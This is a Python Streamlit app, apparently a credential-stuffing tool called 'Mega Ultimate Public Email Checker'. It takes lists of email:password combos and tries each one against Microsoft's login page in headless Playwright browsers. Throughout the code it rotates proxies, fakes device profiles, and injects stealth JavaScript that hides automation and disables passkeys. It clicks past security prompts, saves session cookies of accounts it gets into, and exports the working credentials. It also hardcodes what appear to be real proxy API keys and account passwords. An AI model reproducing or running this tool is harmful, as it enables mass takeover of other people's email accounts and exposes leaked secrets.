import os
import re
import time
import json
import random
import requests
import concurrent.futures
import threading
import hashlib
from datetime import datetime
from urllib.parse import urlparse, parse_qs, unquote

import streamlit as st

# --- Page Configuration ---
st.set_page_config(
    page_title="Mega Ultimate Public Email Checker",
    page_icon="⚡",
    layout="wide",
)

# --- Custom CSS for Styling ---
st.markdown("""
<style>
    .stSlider input[type=range] {
        accent-color: #ff4b4b;
        cursor: pointer;
    }
    .help-box {
        background-color: #1e1e2f;
        border-left: 3px solid #ff4b4b;
        padding: 6px 10px;
        margin: 2px 0 8px 0;
        font-size: 0.8rem;
        color: #d1d5db;
        border-radius: 4px;
    }
    .metric-card {
        background-color: #161b22;
        border: 1px solid #30363d;
        padding: 15px;
        border-radius: 6px;
    }
</style>
""", unsafe_allow_html=True)

# --- Thread Locks & Persistent Caches ---
cache_lock = threading.Lock()
proxy_lock = threading.Lock()
results_lock = threading.Lock()

SESSION_DIR = "sessions"
RESULTS_DIR = "mail_results"
DEBUG_DIR = "browser_debug"
for d in [SESSION_DIR, RESULTS_DIR, DEBUG_DIR]:
    os.makedirs(d, exist_ok=True)

CACHE_FILE = "domain_cache.json"
PROXY_META_FILE = "proxy_meta.json"

def load_json(path, default=None):
    if default is None:
        default = {}
    if os.path.exists(path):
        try:
            with open(path, encoding="utf-8") as f:
                return json.load(f)
        except Exception:
            return default
    return default

proxy_meta = load_json(PROXY_META_FILE, {})

def save_proxy_meta():
    try:
        with proxy_lock:
            with open(PROXY_META_FILE, "w", encoding="utf-8") as f:
                json.dump(proxy_meta, f, indent=2)
    except Exception:
        pass

# --- Disposable Domain Blocklist ---
DISPOSABLE_DOMAINS = {
    "mailinator.com", "tempmail.com", "10minutemail.com", "guerrillamail.com",
    "throwawaymail.com", "yopmail.com", "trashmail.com", "getairmail.com",
    "sharklasers.com", "dispostable.com", "maildrop.cc", "getnada.com",
    "mohmal.com", "fakemailgenerator.com", "temp-mail.org"
}

def is_disposable_email(email):
    try:
        domain = email.split("@")[1].lower()
        return domain in DISPOSABLE_DOMAINS
    except Exception:
        return False

# --- MS Domains & Device Profiles ---
MS_DOMAINS = {
    "outlook.com", "hotmail.com", "live.com", "msn.com", "passport.com",
    "outlook.com.br", "outlook.co.uk", "outlook.de", "outlook.fr", "outlook.es",
    "outlook.it", "outlook.jp", "hotmail.co.uk", "hotmail.com.br", "hotmail.de",
    "live.co.uk", "live.fr", "live.de",
}

DEVICE_PROFILES = [
    {
        "name": "Windows Desktop Chrome",
        "viewport": {"width": 1920, "height": 1080},
        "ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36"
    },
    {
        "name": "MacBook Pro Safari",
        "viewport": {"width": 1440, "height": 900},
        "ua": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2.1 Safari/605.1.15"
    },
    {
        "name": "Google Pixel 5 Mobile",
        "viewport": {"width": 393, "height": 851},
        "ua": "Mozilla/5.0 (Linux; Android 11; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36",
        "is_mobile": True,
        "has_touch": True
    },
    {
        "name": "iPhone 13 Mobile",
        "viewport": {"width": 390, "height": 844},
        "ua": "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
        "is_mobile": True,
        "has_touch": True
    }
]

STEALTH_JS = """
Object.defineProperty(navigator, 'webdriver', { get: () => undefined });
try { window.PublicKeyCredential = undefined; } catch(e) {}
if (navigator.credentials) {
  navigator.credentials.get = () => Promise.reject(new DOMException("The operation was aborted.", "NotAllowedError"));
  navigator.credentials.create = () => Promise.reject(new DOMException("The operation was aborted.", "NotAllowedError"));
}
window.chrome = window.chrome || { runtime: {} };
"""

# --- Initialize Session States ---
if "LIVE_SESSIONS" not in st.session_state:
    st.session_state.LIVE_SESSIONS = {}
if "SUCCESSFUL_ACCOUNTS" not in st.session_state:
    st.session_state.SUCCESSFUL_ACCOUNTS = []
if "filtered_disposable" not in st.session_state:
    st.session_state.filtered_disposable = []
if "fetched_proxies" not in st.session_state:
    st.session_state.fetched_proxies = ""
if "proxy_logs" not in st.session_state:
    st.session_state.proxy_logs = []
if "engine_logs" not in st.session_state:
    st.session_state.engine_logs = []
if "running" not in st.session_state:
    st.session_state.running = False
if "proxy_stats" not in st.session_state:
    st.session_state.proxy_stats = {"total": 0, "alive": 0, "dead": 0, "countries": {}}
if "help_states" not in st.session_state:
    st.session_state.help_states = {}

def log_action(message):
    timestamp = datetime.now().strftime("%H:%M:%S")
    log_entry = f"[{timestamp}] 🖱️ ACTION: {message}"
    with results_lock:
        st.session_state.engine_logs.append(log_entry)

DEFAULT_BROWSER_CFG = {
    "BROWSER_TIMEOUT": 45,
    "MAX_ACCOUNTS": 5000,
    "DELAY_BETWEEN_ACCOUNTS": 45,
    "REST_AFTER_FAIL": 75,
    "REST_AFTER_SUCCESS": 25,
    "TYPING_MS": 80,
    "MOUSE_MS": 100,
    "PAGE_WAIT_S": 3,
    "MIN_PROXY_SCORE": 40,
    "MAX_TRIES_PER_ACCOUNT": 3,
    "PROXY_MODE": "fallback",
    "POOL_MODE": "us_only",
    "FILTER_DISPOSABLE": True,
    "FIRE_UP": True,
    "USE_PROXIES": True,
    "STEALTH": True,
    "FORCE_EN_US": True,
    "SCREENSHOT_FINAL": True,
    "ENABLE_DEBUG": True,
    "RETRY_CLOUDFLARE": True,
    "CANCEL_SECURITY_PENDING": False,
    "WEBHOOK_URL": "",
    "CAPSOLVER_KEY": "",
}

if "BROWSER_CFG" not in st.session_state:
    st.session_state.BROWSER_CFG = DEFAULT_BROWSER_CFG.copy()

MODE_PRESETS = {
    "slow": {"DELAY_BETWEEN_ACCOUNTS": 90, "REST_AFTER_FAIL": 120, "REST_AFTER_SUCCESS": 40, "TYPING_MS": 120},
    "normal": {"DELAY_BETWEEN_ACCOUNTS": 45, "REST_AFTER_FAIL": 75, "REST_AFTER_SUCCESS": 25, "TYPING_MS": 80},
    "fast": {"DELAY_BETWEEN_ACCOUNTS": 25, "REST_AFTER_FAIL": 40, "REST_AFTER_SUCCESS": 15, "TYPING_MS": 50},
    "superfast": {"DELAY_BETWEEN_ACCOUNTS": 10, "REST_AFTER_FAIL": 20, "REST_AFTER_SUCCESS": 5, "TYPING_MS": 30},
}

def instant_help_public(key_name, description_text, label_text):
    if key_name not in st.session_state.help_states:
        st.session_state.help_states[key_name] = {"visible": False, "time": 0}
    
    state_data = st.session_state.help_states[key_name]
    if state_data.get("visible", False):
        if time.time() - state_data.get("time", 0) > 10.0:
            st.session_state.help_states[key_name]["visible"] = False

    col_lbl, col_btn = st.sidebar.columns([0.85, 0.15])
    with col_lbl:
        st.markdown(f"**{label_text}**")
    with col_btn:
        if st.button("❓", key=f"help_btn_{key_name}", help="Toggle help description"):
            current = st.session_state.help_states[key_name]["visible"]
            st.session_state.help_states[key_name] = {"visible": not current, "time": time.time()}
            st.rerun()

    if st.session_state.help_states[key_name]["visible"]:
        st.sidebar.markdown(f"<div class='help-box'>💡 {description_text}</div>", unsafe_allow_html=True)

# ==========================================
# PROXY & WEBSHARE CONFIGURATION (FIXED)
# ==========================================
WEBSHARE_KEYS = [
    "ty1wj93kaw0k1ab7vv05lqvga86zs6tu2ngqjkyo",   
    "z6rhxx6390l1kitf5zjptukkjbjielb56mwqr741",  
    "a0afl99r624zz7fs8fh5y1ck5f9a0me3kajz5xtn",
    "5gtgl0pheucjczwxjjwzh1u7edgs65dp4cyfbcl3",
    "dqibfb8n2kkp7w0sku8gielshqqv4lcq6vuzdltb",
    "mpb64af9rak5931lfvmoozs9hsepeovj59ggrufz",
    "0hnwlw0e590d0yo9odtr411p4rw85uqv3oenc0ej",
    "3enappszm6k7p4tm5czf9as9d3g95jgasbuuvcr8",
    "myyibaqdn66o8pavn4kti90x2ametb9117zdwyi3",
]

OXYLABS_PROXIES = [
    "user-Positive_S79mq-country-US:Kingfrosh5252+@dc.oxylabs.io:8000",         
    "user-Positivekenny_ls8CB-country-US:Adejoke52_52@dc.oxylabs.io:8000",       
]

PROXY_TEST_TIMEOUT = 5
MAX_TEST_WORKERS = 12

def parse_proxy_for_playwright(proxy_str):
    try:
        proxy_str = (proxy_str or "").strip()
        if not proxy_str:
            return None
        if "@" in proxy_str and "://" not in proxy_str:
            cred, host = proxy_str.rsplit("@", 1)
            u, pw = cred.split(":", 1)
            h, port = host.split(":")
            return {"server": f"http://{h}:{port}", "username": u, "password": pw}
        parts = proxy_str.split(":")
        if len(parts) == 4:
            return {"server": f"http://{parts[0]}:{parts[1]}", "username": parts[2], "password": parts[3]}
        elif len(parts) == 2:
            return {"server": f"http://{parts[0]}:{parts[1]}"}
        return None
    except Exception:
        return None

def compute_real_score(success_count, fail_count, initial_latency_score=80):
    total = success_count + fail_count
    if total == 0:
        return initial_latency_score
    smoothed_success = success_count + 2
    smoothed_fail = fail_count + 1
    smoothed_total = smoothed_success + smoothed_fail
    success_rate = (smoothed_success / smoothed_total) * 100
    score = int(success_rate - (fail_count * 5))
    return max(0, min(100, score))

def test_one(proxy_str):
    proxy_formatted = proxy_str if "@" in proxy_str else f"http://{proxy_str}"
    start = time.time()
    try:
        r = requests.get("https://api.ipify.org?format=json", proxies={"http": proxy_formatted, "https": proxy_formatted}, timeout=PROXY_TEST_TIMEOUT)
        if r.status_code != 200:
            return (proxy_str, False, 0, "-", "-")
        latency = int((time.time() - start) * 1000)
        country = "US"
        try:
            g = requests.get("http://ip-api.com/json/", proxies={"http": proxy_formatted, "https": proxy_formatted}, timeout=3).json()
            country = g.get("countryCode", "US")
        except Exception:
            pass
        initial_score = max(0, min(100, 100 - int(latency / 15)))
        with proxy_lock:
            if proxy_str not in proxy_meta:
                proxy_meta[proxy_str] = {"fails": 0, "success": 0, "country": country}
            m = proxy_meta[proxy_str]
            m["success"] = m.get("success", 0) + 1
            m["score"] = compute_real_score(m["success"], m.get("fails", 0), initial_score)
            m["country"] = country
        save_proxy_meta()
        return (proxy_str, True, latency, country, "Unknown")
    except Exception:
        with proxy_lock:
            if proxy_str not in proxy_meta:
                proxy_meta[proxy_str] = {"fails": 0, "success": 0, "country": "US"}
            proxy_meta[proxy_str]["fails"] = proxy_meta[proxy_str].get("fails", 0) + 1
        save_proxy_meta()
        return (proxy_str, False, 0, "-", "-")

def load_webshare(api_key):
    """Fixed Webshare API parser supporting v2 endpoint responses."""
    if not api_key.strip():
        return []
    out = []
    url = "https://proxy.webshare.io/api/v2/proxy/list/download/"
    headers = {"Authorization": f"Token {api_key.strip()}"}
    try:
        r = requests.get(url, headers=headers, timeout=10)
        if r.status_code == 200:
            lines = r.text.strip().split("\n")
            for line in lines:
                if line.strip():
                    parts = line.strip().split(":")
                    if len(parts) == 4:
                        ip, port, user, pwd = parts
                        out.append(f"{user}:{pwd}@{ip}:{port}")
        else:
            # Fallback to standard json list if download endpoint returns json
            json_url = "https://proxy.webshare.io/api/v2/proxy/list/?mode=direct&page=1&page_size=100"
            r_json = requests.get(json_url, headers=headers, timeout=10)
            if r_json.status_code == 200:
                data = r_json.json()
                for it in data.get("results", []):
                    out.append(f"{it['username']}:{it['password']}@{it['proxy_address']}:{it['port']}")
    except Exception:
        pass
    return out

def send_telegram_alert(message):
    cfg = st.session_state.BROWSER_CFG
    url = cfg.get("WEBHOOK_URL", "").strip()
    if not url:
        return
    try:
        requests.post(url, json={"content": message}, timeout=5)
    except Exception:
        pass

# ==========================================
# SIDEBAR CONTROL PANEL (SLIDE-OUT)
# ==========================================
st.sidebar.title("🎛️ Engine Control Panel")

if st.sidebar.button("🔄 Reset Config to Default", use_container_width=True):
    log_action("Clicked 'Reset Config to Default'")
    st.session_state.BROWSER_CFG = DEFAULT_BROWSER_CFG.copy()
    for key in list(st.session_state.keys()):
        if key.startswith("sb_") or key.startswith("opt_"):
            del st.session_state[key]
    st.sidebar.success("Settings restored & sliders reset!")
    time.sleep(0.3)
    st.rerun()

st.sidebar.markdown("---")
st.sidebar.subheader("🌐 Proxy Management & Health")

col_p1, col_p2 = st.sidebar.columns(2)
with col_p1:
    st.markdown(f"**Loaded:** {len([p for p in st.session_state.fetched_proxies.splitlines() if p.strip()])}")
with col_p2:
    st.markdown(f"**Alive:** {st.session_state.proxy_stats.get('alive', 0)}")

with st.sidebar.expander("➕ Add Custom Proxies"):
    custom_proxies_input = st.text_area("Paste proxies (IP:Port:User:Pass)", placeholder="192.168.1.1:8080:user:pass", key="custom_proxies_box")
    if st.button("Append Custom Proxies", use_container_width=True):
        if custom_proxies_input.strip():
            current = st.session_state.fetched_proxies.strip()
            new_combined = (current + "\n" + custom_proxies_input).strip() if current else custom_proxies_input.strip()
            st.session_state.fetched_proxies = new_combined
            st.sidebar.success("Appended custom proxies successfully!")

if st.sidebar.button("🚀 Fetch & Test All Proxies", type="primary", use_container_width=True):
    log_action("Clicked 'Fetch & Test All Proxies'")
    with st.spinner("Scraping Webshare/Oxylabs & testing health..."):
        try:
            all_raw = []
            logs = []
            country_counts = {}
            alive_count, dead_count = 0, 0

            for i, key in enumerate(WEBSHARE_KEYS, 1):
                lst = load_webshare(key)
                logs.append(f"Webshare key #{i} → Loaded {len(lst)} nodes")
                all_raw.extend(lst)
            for ox in OXYLABS_PROXIES:
                all_raw.append(ox)
            
            all_raw = list(dict.fromkeys(all_raw))
            alive = []
            
            with concurrent.futures.ThreadPoolExecutor(max_workers=MAX_TEST_WORKERS) as ex:
                futures = {ex.submit(test_one, p): p for p in all_raw}
                for fut in concurrent.futures.as_completed(futures):
                    res = fut.result()
                    if res and res[1]:
                        alive.append(res[0])
                        alive_count += 1
                        country_counts[res[3]] = country_counts.get(res[3], 0) + 1
                    else:
                        dead_count += 1
                        
            st.session_state.fetched_proxies = "\n".join(alive)
            st.session_state.proxy_logs = logs
            st.session_state.proxy_stats = {"total": len(all_raw), "alive": alive_count, "dead": dead_count, "countries": country_counts}
            log_action(f"Proxy fetch complete. Found {alive_count} working nodes.")
            st.sidebar.success(f"Cached {alive_count} working proxies!")
            st.rerun()
        except Exception as e:
            st.sidebar.error(f"Proxy fetch error: {str(e)}")

with st.sidebar.expander("📈 Proxy Health & Geo Dashboard"):
    stats = st.session_state.proxy_stats
    st.markdown(f"**Total Scraped:** {stats.get('total', 0)} | **Alive:** {stats.get('alive', 0)} | **Dead:** {stats.get('dead', 0)}")
    countries = stats.get("countries", {})
    if countries:
        st.bar_chart(countries)
    else:
        st.info("Run proxy fetch to populate geo analytics.")

if st.sidebar.button("🧹 Clear Dead / Low-Score Proxies", use_container_width=True):
    log_action("Clicked 'Clear Dead / Low-Score Proxies'")
    current_lines = [p.strip() for p in st.session_state.fetched_proxies.splitlines() if p.strip()]
    filtered = []
    min_sc = st.session_state.BROWSER_CFG.get("MIN_PROXY_SCORE", 40)
    for p in current_lines:
        score = proxy_meta.get(p, {}).get("score", 50)
        if score >= min_sc:
            filtered.append(p)
    st.session_state.fetched_proxies = "\n".join(filtered)
    st.sidebar.success(f"Pruned pool. {len(filtered)} healthy proxies remaining.")

st.sidebar.markdown("---")
st.sidebar.subheader("⚙️ Advanced Configuration & Toggles")
cfg = st.session_state.BROWSER_CFG

cfg["USE_PROXIES"] = st.sidebar.checkbox("Use Proxies", value=cfg.get("USE_PROXIES", True), key="opt_use_proxies")
cfg["STEALTH"] = st.sidebar.checkbox("Stealth Mode", value=cfg.get("STEALTH", True), key="opt_stealth")
cfg["FIRE_UP"] = st.sidebar.checkbox("Warm-up Browser (Fresh Context)", value=cfg.get("FIRE_UP", True), key="opt_fireup")
cfg["FORCE_EN_US"] = st.sidebar.checkbox("Force English UI (en-US)", value=cfg.get("FORCE_EN_US", True), key="opt_en_us")
cfg["SCREENSHOT_FINAL"] = st.sidebar.checkbox("Save Failure Screenshots", value=cfg.get("SCREENSHOT_FINAL", True), key="opt_screenshot")
cfg["FILTER_DISPOSABLE"] = st.sidebar.checkbox("Block Disposable Emails", value=cfg.get("FILTER_DISPOSABLE", True), key="opt_disposable")
cfg["RETRY_CLOUDFLARE"] = st.sidebar.checkbox("Retry Cloudflare Challenge", value=cfg.get("RETRY_CLOUDFLARE", True), key="opt_cloudflare")
cfg["ENABLE_DEBUG"] = st.sidebar.checkbox("Enable Debug Mode", value=cfg.get("ENABLE_DEBUG", True), key="opt_debug_mode")

st.sidebar.markdown("🔒 **WebAuthn / Passkeys:** Disabled by default for stability")

cfg["PROXY_MODE"] = st.sidebar.selectbox("PROXY_MODE", ["fallback", "aggressive", "sticky", "off"], index=0, key="sb_proxy_mode")

st.sidebar.markdown("---")
instant_help_public("h_speed", "Select automated timing profile preset.", "Speed Mode Preset:")
speed_mode = st.sidebar.selectbox("Speed Preset Selector", ["slow", "normal", "fast", "superfast"], index=1, key="sb_speed", label_visibility="collapsed")

if st.sidebar.button("⚡ Apply Mode Preset", use_container_width=True):
    try:
        preset = MODE_PRESETS[speed_mode]
        for k, v in preset.items():
            cfg[k] = v
        st.sidebar.success(f"Applied preset: {speed_mode}")
        st.rerun()
    except Exception as e:
        st.sidebar.error(f"Error applying preset: {e}")

st.sidebar.markdown("---")
st.sidebar.subheader("⏱️ Throttling & Human Sliders")
cfg["TYPING_MS"] = st.sidebar.slider("Typing Speed (ms/char)", 20, 200, cfg["TYPING_MS"], 10, key="sb_typing")
cfg["MOUSE_MS"] = st.sidebar.slider("Mouse Move Delay (ms)", 20, 300, cfg["MOUSE_MS"], 10, key="sb_mouse")
cfg["TIMEOUT"] = st.sidebar.slider("Browser Timeout (s)", 20, 120, cfg["BROWSER_TIMEOUT"], 5, key="sb_timeout")
cfg["DELAY_BETWEEN_ACCOUNTS"] = st.sidebar.slider("Delay / Account (s)", 5, 120, cfg["DELAY_BETWEEN_ACCOUNTS"], 5, key="sb_delay")

with st.sidebar.expander("🔔 Webhook & External API"):
    cfg["WEBHOOK_URL"] = st.text_input("Discord / Telegram Webhook URL", value=cfg.get("WEBHOOK_URL", ""))
    cfg["CAPSOLVER_KEY"] = st.text_input("CapSolver API Key (Optional)", value=cfg.get("CAPSOLVER_KEY", ""))

# ==========================================
# ASYNCHRONOUS PLAYWRIGHT AUTOMATION ENGINE
# ==========================================
INBOX_MARKERS = (
    "new mail", "inbox", "focused", "deleted items", "junk email",
    "sent items", "drafts", "archive", "unread", "mark as read", "reply",
)

EMAIL_SEL = "input[type='email'], input[name='loginfmt'], input[name='login'], input[type='text']"
PASS_SEL = "input[type='password'], input[name='passwd'], #i0118"

RECOVERY_PWD = ["Use your password", "Use my password", "Use a password instead", "Sign in with password"]

def parse_proxy(p):
    if not p:
        return None
    p = p.strip()
    if "@" in p and "://" not in p:
        cred, host = p.rsplit("@", 1)
        u, pw = cred.split(":", 1)
        h, port = host.split(":")
        return {"server": f"http://{h}:{port}", "username": u, "password": pw}
    parts = p.split(":")
    if len(parts) == 2:
        return {"server": f"http://{parts[0]}:{parts[1]}"}
    if len(parts) == 4:
        return {"server": f"http://{parts[0]}:{parts[1]}", "username": parts[2], "password": parts[3]}
    return None

def sticky_idx(email, n):
    return int(hashlib.md5(email.lower().encode()).hexdigest(), 16) % n if n else 0

async def human_fill(page, loc, text, typing_ms=80):
    try:
        await loc.click(timeout=2000, force=True)
    except Exception:
        pass
    try:
        await loc.fill("")
    except Exception:
        pass
    try:
        for ch in text:
            await loc.type(ch, delay=random.randint(int(typing_ms * 0.5), int(typing_ms * 1.5)))
        return
    except Exception:
        await loc.fill(text)

async def click_text(page, labels):
    for t in labels:
        for sel in (
            f"button:has-text('{t}')",
            f"a:has-text('{t}')",
            f"[role='button']:has-text('{t}')",
            f"input[value='{t}']",
            f"span:has-text('{t}')",
        ):
            try:
                loc = page.locator(sel).first
                if await loc.count() and await loc.is_visible(timeout=400):
                    await loc.click(timeout=4000)
                    return t
            except Exception:
                continue
    return None

def is_real_inbox(sc):
    u = (sc.get("url") or "").lower()
    low = sc.get("low") or ""
    text = (sc.get("text") or "").strip()
    if any(x in u for x in ("login.", "oauth", "account.live.com", "signin", "ppsecure")):
        return False
    if len(text) < 40 and not sc.get("buttons"):
        return False
    if any(m in low for m in INBOX_MARKERS):
        return True
    return False

async def read_screen(page, tag=""):
    url = page.url or ""
    title, text, buttons = "", "", []
    try:
        title = await page.title()
    except Exception:
        pass
    try:
        text = (await page.locator("body").inner_text(timeout=3500))[:1200]
    except Exception:
        pass
    try:
        for el in (await page.locator("button, a, [role='button'], input[type='submit']").all())[:25]:
            t = ((await el.inner_text()) or (await el.get_attribute("value") or "")).strip()
            if t and len(t) < 90:
                buttons.append(t)
    except Exception:
        pass
    low = f"{url} {title} {text}".lower()
    return {"url": url, "title": title, "text": text, "buttons": buttons, "low": low}

def match_pattern(sc):
    u, low = sc["url"].lower(), sc["low"]
    title = (sc.get("title") or "").lower()
    btns = " ".join(sc.get("buttons") or []).lower()

    if is_real_inbox(sc):
        return "success", "success", "inbox"

    if any(x in low for x in ("password is incorrect", "that password is incorrect", "incorrect password", "invalid password")):
        return "stop", "wrong_password", "wrong password"
    if any(x in low for x in ("try again later", "can't sign you in right now", "too many sign-in", "temporarily locked", "rate limit")):
        return "stop", "rate_limited", "rate limited / try again later"

    if "enter your password" in low or "enter your password" in title or ("password" in low and "next" in btns):
        return "password_step", None, "enter password"

    if any(x in low for x in ("security info still accurate", "is your security info still accurate")):
        return "sec_confirm", None, "security info still accurate"

    if any(x in low for x in ("updating our terms", "microsoft services agreement", "updated the microsoft services")):
        return "terms", None, "terms update"

    if "stay signed in" in low:
        return "kmsi", None, "stay signed in"

    if any(x in low for x in ("passkey", "signing in with your passkey", "face, fingerprint", "fido")):
        return "fido", None, "passkey path"

    if any(x in low for x in ("unusual sign-in", "help us protect", "verify your email", "send code", "approve sign-in", "enter the code")):
        return "stop", "2fa_required", "2fa / verification checkpoint"

    if "email or phone" in low or "sign in" in low:
        return "email_step", None, "sign-in form"

    return "inspect", None, "inspect"

async def scrape_inbox_snippet(page):
    try:
        text = await page.locator("body").inner_text()
        lines = [line.strip() for line in text.splitlines() if line.strip()]
        snippet = " | ".join(lines[:3]) if lines else "Inbox loaded successfully."
        return snippet[:150]
    except Exception:
        return "Authenticated inbox state active."

async def execute_login_flow(page, email, password, config):
    t0 = time.time()
    email_done = pass_done = False
    
    try:
        await page.goto("https://login.live.com/", wait_until="domcontentloaded", timeout=30000)
    except Exception as e:
        return "error", f"nav fail: {e}"

    for step in range(15):
        if time.time() - t0 > 120:
            return "error", "account timeout"

        sc = await read_screen(page, f"step{step}")
        action, status, detail = match_pattern(sc)

        if action == "success" or status == "success":
            snippet = await scrape_inbox_snippet(page)
            return "success", snippet
        if action == "stop":
            return status, detail

        if action == "sec_confirm":
            await click_text(page, ["Looks good!", "Looks good", "Yes", "Continue", "Next"])
            await page.wait_for_timeout(2000)
            continue

        if action == "terms":
            await click_text(page, ["Next", "Accept", "Continue", "OK"])
            await page.wait_for_timeout(2000)
            continue

        if action == "kmsi":
            await click_text(page, ["Yes", "No"])
            await page.wait_for_timeout(1500)
            continue

        if action == "use_password" or action == "fido":
            await click_text(page, RECOVERY_PWD)
            await page.wait_for_timeout(1500)
            continue

        if action == "password_step" or not pass_done:
            pw_loc = page.locator(PASS_SEL).first
            if await pw_loc.count() and await pw_loc.is_visible():
                await human_fill(page, pw_loc, password, config.get("TYPING_MS", 80))
                await click_text(page, ["Sign in", "Next", "Yes"])
                pass_done = True
                await page.wait_for_timeout(3000)
                continue

        if action == "email_step" or not email_done:
            em_loc = page.locator(EMAIL_SEL).first
            if await em_loc.count() and await em_loc.is_visible():
                await human_fill(page, em_loc, email, config.get("TYPING_MS", 80))
                await click_text(page, ["Next", "Sign in"])
                email_done = True
                await page.wait_for_timeout(2500)
                continue

        await page.wait_for_timeout(1000)

    return "error", "max steps reached"

def run_checker_engine(accounts_list, provider_override, proxies_pool, config, max_workers):
    try:
        import asyncio
        from playwright.sync_api import sync_playwright

        with results_lock:
            st.session_state.engine_logs.append(f"Engine launched for {len(accounts_list)} accounts with {max_workers} workers.")

        def worker_thread_task():
            with sync_playwright() as p:
                browser = p.chromium.launch(
                    headless=True,
                    args=["--disable-blink-features=AutomationControlled", "--no-sandbox", "--disable-dev-shm-usage"]
                )
                
                for line in accounts_list:
                    if not st.session_state.running:
                        break
                    if ":" not in line:
                        continue
                    email, password = line.strip().split(":", 1)
                    email, password = email.strip(), password.strip()

                    if config.get("FILTER_DISPOSABLE", True) and is_disposable_email(email):
                        with results_lock:
                            st.session_state.filtered_disposable.append(email)
                            st.session_state.engine_logs.append(f"🛡️ Skipped Disposable: {email}")
                        continue

                    device = random.choice(DEVICE_PROFILES)
                    selected_proxy = None
                    proxy_dict = None

                    if config["USE_PROXIES"] and proxies_pool:
                        idx = sticky_idx(email, len(proxies_pool))
                        selected_proxy = proxies_pool[idx]
                        proxy_dict = parse_proxy_for_playwright(selected_proxy)

                    context_args = {
                        "user_agent": device["ua"],
                        "viewport": device["viewport"],
                        "locale": "en-US" if config.get("FORCE_EN_US", True) else "default",
                    }
                    if proxy_dict:
                        context_args["proxy"] = proxy_dict

                    try:
                        context = browser.new_context(**context_args)
                        context.add_init_script(STEALTH_JS)
                        page = context.new_page()

                        loop = asyncio.new_event_loop()
                        asyncio.set_event_loop(loop)
                        status, detail = loop.run_until_complete(execute_login_flow(page, email, password, config))

                        timestamp = datetime.now().strftime("%H:%M:%S")
                        with results_lock:
                            if status == "success":
                                msg = f"[{timestamp}] ✅ SUCCESS: {email} verified! [{detail}]"
                                st.session_state.engine_logs.append(msg)
                                st.session_state.LIVE_SESSIONS[email] = {"status": "Active", "time": timestamp, "proxy": selected_proxy or "Direct", "snippet": detail}
                                hit_entry = f"{email}:{password}"
                                if hit_entry not in st.session_state.SUCCESSFUL_ACCOUNTS:
                                    st.session_state.SUCCESSFUL_ACCOUNTS.append(hit_entry)
                                
                                safe_name = re.sub(r'[^a-zA-Z0-9_-]', '_', email)
                                context.storage_state(path=os.path.join(SESSION_DIR, f"{safe_name}.json"))
                                send_telegram_alert(f"⚡ HIT SUCCESS: {email} | Proxy: {selected_proxy}")
                            else:
                                st.session_state.engine_logs.append(f"[{timestamp}] ❌ {status.upper()}: {email} ({detail})")

                        context.close()
                    except Exception as e:
                        with results_lock:
                            st.session_state.engine_logs.append(f"⚠️ Worker Exception for {email}: {str(e)}")

                    time.sleep(config.get("DELAY_BETWEEN_ACCOUNTS", 45))

                browser.close()

        t = threading.Thread(target=worker_thread_task, daemon=True)
        t.start()
    except Exception as e:
        st.session_state.running = False
        with results_lock:
            st.session_state.engine_logs.append(f"🚨 Critical Engine Error: {str(e)}")

# ==========================================
# MAIN INTERFACE
# ==========================================
st.title("⚡ Mega Ultimate Public Email Checker")
st.markdown("Custom URL Slug: `positive-public-email-checker.streamlit.app` — Powered by Session State Persistence & Autonomous Interstitial Parsers.")

tab_engine, tab_terminal = st.tabs([
    "🚀 Engine Runner", 
    "💻 Terminal Remote"
])

with tab_engine:
    st.subheader("Batch Account & Dynamic Provider Processor")
    
    col_input1, col_input2 = st.columns(2)
    with col_input1:
        st.markdown("### 📝 Paste Combos")
        accounts_pasted = st.text_area(
            "Paste combo format",
            height=140,
            placeholder="account1@outlook.com:Pass123!\naccount2@gmail.com:Secret456!",
            label_visibility="collapsed"
        )
    with col_input2:
        st.markdown("### 📁 Upload Combo File")
        uploaded_file = st.file_uploader("Upload .txt combo file", type=["txt"], label_visibility="collapsed")
    
    file_accounts = []
    if uploaded_file is not None:
        try:
            content = uploaded_file.getvalue().decode("utf-8", errors="ignore")
            file_accounts = [line.strip() for line in content.splitlines() if line.strip() and ":" in line]
            st.success(f"Loaded {len(file_accounts)} accounts from uploaded file!")
        except Exception as e:
            st.error(f"Error reading file: {e}")

    col_opt1, col_opt2 = st.columns(2)
    with col_opt1:
        email_provider = st.selectbox(
            "Select Provider Mode",
            [
                "Auto-Detect (Dynamic Router)", 
                "Microsoft (Outlook / Hotmail / Live)", 
                "Google (Gmail / Workspace)", 
                "Yahoo / AOL Mail"
            ],
            key="eng_provider"
        )
    with col_opt2:
        max_threads = st.number_input("Concurrent Threads", min_value=1, max_value=15, value=3, key="eng_threads")

    proxies_pool = [p.strip() for p in st.session_state.fetched_proxies.splitlines() if p.strip()]

    c1, c2, c3 = st.columns(3)
    with c1:
        start_engine = st.button("▶️ Launch Checker Engine", type="primary", use_container_width=True)
    with c2:
        stop_engine = st.button("⏹️ Stop / Force Unlock", use_container_width=True)
    with c3:
        if st.button("🧹 Clear Logs & Cache", use_container_width=True):
            log_action("Clicked 'Clear Logs & Cache'")
            st.session_state.engine_logs = []
            st.session_state.proxy_logs = []
            st.session_state.filtered_disposable = []
            st.success("Logs successfully cleared!")
            st.rerun()

    if stop_engine:
        log_action("Clicked 'Stop / Force Unlock'")
        st.session_state.running = False
        st.warning("Engine force-stopped by user.")

    if start_engine:
        log_action("Clicked 'Launch Checker Engine'")
        pasted_lines = [line.strip() for line in accounts_pasted.splitlines() if line.strip() and ":" in line]
        combined_accounts = list(dict.fromkeys(pasted_lines + file_accounts))
        
        if not combined_accounts:
            st.error("Validation Error: Please paste or upload valid account lines in email:password format.")
        else:
            st.session_state.running = True
            run_checker_engine(combined_accounts, email_provider, proxies_pool, st.session_state.BROWSER_CFG, max_threads)
            st.success(f"Engine started for {len(combined_accounts)} accounts!")
            st.rerun()

    if st.session_state.SUCCESSFUL_ACCOUNTS:
        st.markdown("### 📥 Flexible Export Format Options")
        export_mode = st.selectbox("Select Export Format", ["email:password", "JSON Session Bundle", "URL-Encoded Cookies"], key="exp_mode")
        
